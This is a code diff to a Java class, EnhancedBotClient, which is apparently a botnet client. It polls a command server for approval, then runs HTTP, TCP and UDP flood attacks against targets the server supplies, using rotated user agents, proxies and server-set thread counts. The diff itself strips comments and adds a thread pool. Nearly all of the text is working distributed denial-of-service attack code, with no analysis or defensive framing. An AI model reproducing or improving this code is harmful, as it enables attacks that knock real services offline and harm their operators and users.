@@ -2,6 +2,7 @@ import java.io.*;
 import java.net.*;
 import java.util.*;
 import java.util.concurrent.*;
+import java.util.concurrent.atomic.AtomicInteger;  // ADD THIS LINE
 import java.security.*;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
@@ -25,6 +26,8 @@ public class EnhancedBotClient {
     
     private List<Map<String, String>> userAgents = new ArrayList<>();
     private List<String> proxies = new ArrayList<>();
+    
+    private ExecutorService threadPool = Executors.newCachedThreadPool();  // ADD THIS LINE
     
     public EnhancedBotClient() {
         this.botId = generateBotId();
@@ -297,10 +300,9 @@ public class EnhancedBotClient {
     private void cmdHttpFlood(Map<String, Object> cmd) {
         String target = (String) cmd.get("target");
         int duration = ((Number) cmd.get("duration")).intValue();
-        int threads = ((Number) cmd.get("threads")).intValue(); // Use server-defined threads
+        int threads = ((Number) cmd.get("threads")).intValue();
         String method = (String) cmd.getOrDefault("method", "GET");
         
-        // Get user agents from command or use defaults
         List<String> userAgentList = new ArrayList<>();
         if (cmd.containsKey("user_agents")) {
             Object uaObj = cmd.get("user_agents");
@@ -309,8 +311,6 @@ public class EnhancedBotClient {
                 for (int i = 0; i < uaArray.length(); i++) {
                     userAgentList.add(uaArray.getString(i));
                 }
-            } else if (uaObj instanceof List) {
-                userAgentList = (List<String>) uaObj;
             }
         }
         
@@ -320,7 +320,6 @@ public class EnhancedBotClient {
             }
         }
         
-        // Get proxies from command
         List<String> proxyList = new ArrayList<>();
         if (cmd.containsKey("proxies")) {
             Object proxyObj = cmd.get("proxies");
@@ -329,8 +328,6 @@ public class EnhancedBotClient {
                 for (int i = 0; i < proxyArray.length(); i++) {
                     proxyList.add(proxyArray.getString(i));
                 }
-            } else if (proxyObj instanceof List) {
-                proxyList = (List<String>) proxyObj;
             }
         }
         
@@ -393,7 +390,7 @@ public class EnhancedBotClient {
                     }
                     
                     conn.disconnect();
-                    Thread.sleep(1); // Small delay to prevent overload
+                    Thread.sleep(1);
                     
                 } catch (Exception e) {
                     requestCount.incrementAndGet();
@@ -407,7 +404,7 @@ public class EnhancedBotClient {
             }
         };
         
-        System.out.println("[+] Launching " + threads + " attack threads (Server-defined)...");
+        System.out.println("[+] Launching " + threads + " attack threads...");
         
         ExecutorService executor = Executors.newFixedThreadPool(threads);
         List<Future<?>> futures = new ArrayList<>();
@@ -457,7 +454,7 @@ public class EnhancedBotClient {
     private void cmdTcpFlood(Map<String, Object> cmd) {
         String target = (String) cmd.get("target");
         int duration = ((Number) cmd.get("duration")).intValue();
-        int threads = ((Number) cmd.get("threads")).intValue(); // Use server-defined threads
+        int threads = ((Number) cmd.get("threads")).intValue();
         
         String host;
         int port;
@@ -494,13 +491,12 @@ public class EnhancedBotClient {
                     String payload = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
                     socket.getOutputStream().write(payload.getBytes());
                     
-                    // Add random data
                     byte[] randomData = new byte[256];
                     random.nextBytes(randomData);
                     socket.getOutputStream().write(randomData);
                     
                     requestCount.incrementAndGet();
-                    Thread.sleep(10); // Prevent overload
+                    Thread.sleep(10);
                 } catch (Exception e) {
                     requestCount.incrementAndGet();
                     try {
@@ -550,7 +546,7 @@ public class EnhancedBotClient {
     private void cmdUdpFlood(Map<String, Object> cmd) {
         String target = (String) cmd.get("target");
         int duration = ((Number) cmd.get("duration")).intValue();
-        int threads = ((Number) cmd.get("threads")).intValue(); // Use server-defined threads
+        int threads = ((Number) cmd.get("threads")).intValue();
         
         String host;
         int port;
@@ -585,14 +581,14 @@ public class EnhancedBotClient {
                 
                 while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
                     try {
-                        byte[] payload = new byte[random.nextInt(1536) + 512]; // 512-2048 bytes
+                        byte[] payload = new byte[random.nextInt(1536) + 512];
                         random.nextBytes(payload);
                         
                         DatagramPacket packet = new DatagramPacket(payload, payload.length, address, port);
                         socket.send(packet);
                         
                         requestCount.incrementAndGet();
-                        Thread.sleep(1); // Prevent overload
+                        Thread.sleep(1);
                     } catch (Exception e) {
                         // Continue on error
                     }
@@ -660,7 +656,6 @@ public class EnhancedBotClient {
     public void run() {
         while (running) {
             try {
-                // Check internet connection
                 if (!checkInternetConnection()) {
                     waitForInternet();
                     connectionRetries = 0;
@@ -669,7 +664,6 @@ public class EnhancedBotClient {
                 System.out.println("\n[*] Connecting to server: " + SERVER_URL);
                 System.out.println("[*] Waiting for auto-approval...\n");
                 
-                // Wait for approval
                 approved = false;
                 while (!approved) {
                     try {
@@ -713,7 +707,6 @@ public class EnhancedBotClient {
                 
                 System.out.println("[+] Active. Listening for commands...\n");
                 
-                // Main command loop
                 while (running && approved) {
                     try {
                         if (!checkInternetConnection()) {
